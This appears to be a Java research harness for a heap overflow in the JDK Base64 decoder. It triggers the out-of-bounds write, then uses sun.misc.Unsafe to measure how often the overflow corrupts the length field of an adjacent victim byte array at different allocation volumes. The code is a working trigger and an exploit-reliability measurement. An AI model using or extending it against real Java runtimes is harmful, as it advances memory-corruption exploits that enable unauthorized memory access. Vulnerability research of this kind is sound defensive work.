import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Measures how the dst[65]|vic[64] adjacency rate depends on allocation volume.
 *
 * Reads the victim length through Unsafe (offset +12) rather than Java
 * ` .length `, so a corrupted klass cannot perturb the measurement.
 *
 * For each N it reports how many of N pairs landed with a corrupted length.
 */
public final class CorruptionScan {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    private static long abase;

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);
        abase = u.arrayBaseOffset(byte[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);

        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);
        Arrays.fill(warm, (byte) 0x5a);
        try { d.decode(bad, warm); } catch (IllegalArgumentException e) { }
        int ovf = 0;
        for (int i = 50; i < 112; i++) if (warm[i] != (byte) 0x5a) ovf++;
        System.out.println("warm overflowBytes=" + ovf);
        if (ovf != 62) { System.out.println("RESULT=NOT_VULNERABLE"); return; }

        int[] sizes = { 1, 2, 4, 8, 16, 32, 64, 128, 256 };
        System.out.printf("%6s %10s %10s %10s %10s%n",
                "N", "corrupted", "rate", "firstIdx", "adjacent88");

        for (int N : sizes) {
            // fresh pair per index, allocated back-to-back inside one loop
            byte[][] dst = new byte[N][], vic = new byte[N][];
            for (int i = 0; i < N; i++) {
                dst[i] = new byte[65];
                vic[i] = new byte[64];
            }
            int corrupted = 0, first = -1, adj = 0;
            for (int i = 0; i < N; i++) {
                try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
                int len = u.getInt(vic[i], 12);
                if (len != 64) { corrupted++; if (first < 0) first = i; }
                // adjacency check via data-start distance
                Object[] a1 = new Object[] { dst[i] };
                Object[] a2 = new Object[] { vic[i] };
                long d0 = u.getLong(a1, u.arrayBaseOffset(Object[].class));
                long v0 = u.getLong(a2, u.arrayBaseOffset(Object[].class));
                if (v0 - d0 == 88) adj++;
            }
            System.out.printf("%6d %10d %9.0f%% %10d %10d%n",
                    N, corrupted, 100.0 * corrupted / N, first, adj);
        }

        // repeat the smallest size many times to check determinism
        System.out.println("\nrepeat N=4 x10:");
        for (int r = 0; r < 10; r++) {
            byte[][] dst = new byte[4][], vic = new byte[4][];
            for (int i = 0; i < 4; i++) { dst[i] = new byte[65]; vic[i] = new byte[64]; }
            int c = 0;
            for (int i = 0; i < 4; i++) {
                try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
                if (u.getInt(vic[i], 12) != 64) c++;
            }
            System.out.print(c + "/4 ");
        }
        System.out.println();
    }
}
